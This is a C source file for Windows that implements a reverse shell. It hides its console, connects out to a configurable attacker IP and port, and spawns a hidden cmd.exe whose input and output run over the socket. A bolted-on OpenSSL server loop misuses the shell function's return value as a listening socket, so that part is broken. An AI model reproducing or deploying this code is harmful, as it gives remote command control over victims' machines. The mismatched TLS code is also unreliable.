#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"127.0.0.1"
# define CLIENT_PORT (int)444
#endif
SSL_CTX *create_context()
{
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = TLS_server_method();

    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}
void configure_context(SSL_CTX *ctx)
{
    /* Set the key and cert */
    if (SSL_CTX_use_certificate_file(ctx, "server.pem", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, "key.pem", SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}
int shell() {
	FreeConsole();
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
		return (1);
	}

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSAStartup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
int main(int argc, char **argv)
{
    int sock;
    SSL_CTX *ctx;

    /* Ignore broken pipe signals */
    signal(SIGPIPE, SIG_IGN);

    ctx = create_context();

    configure_context(ctx);

    sock = shell();

    /* Handle connections */
    while(1) {
        struct sockaddr_in addr;
        unsigned int len = sizeof(addr);
        SSL *ssl;
        const char reply[] = "test\n";

        int client = accept(sock, (struct sockaddr*)&addr, &len);
        if (client < 0) {
            perror("Unable to accept");
            exit(EXIT_FAILURE);
        }

        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, client);

        if (SSL_accept(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
        } else {
            SSL_write(ssl, reply, strlen(reply));
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client);
    }

    close(sock);
    SSL_CTX_free(ctx);
}